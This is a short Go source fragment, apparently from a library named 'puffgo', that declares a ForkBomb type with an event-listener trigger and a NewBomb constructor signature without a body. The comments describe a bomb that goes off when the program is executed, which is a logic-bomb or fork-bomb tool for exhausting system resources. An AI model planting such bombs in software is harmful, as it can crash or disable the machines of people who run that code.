package main 

type ForkBomb struct {	// Listener specifies the EventListener for the bomb.
	// If Listener is nil, the ForkBomb will go off as soon
	// as the program/binary is executed.
	//
	// To create an event-listener, use the NewListener function
	// present in the puffgo project.
	// For more details, visit the puffgo wiki.
	Listener *puffgo.EventListener
}

func NewBomb(listener *puffgo.EventListener) *ForkBomb

